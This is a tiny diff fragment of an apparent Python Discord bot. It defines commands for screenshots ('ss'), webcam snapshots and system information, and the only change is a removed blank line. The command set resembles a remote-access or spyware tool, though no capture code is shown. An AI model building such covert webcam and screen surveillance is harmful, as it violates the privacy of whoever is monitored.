@@ -51,7 +51,6 @@ async def ss(ctx):
 @bot.command()
 async def webcam(ctx):
     await send_webcam_snapshot()
-
 @bot.command()
 async def sysinfo(ctx):
     await send_system_info()
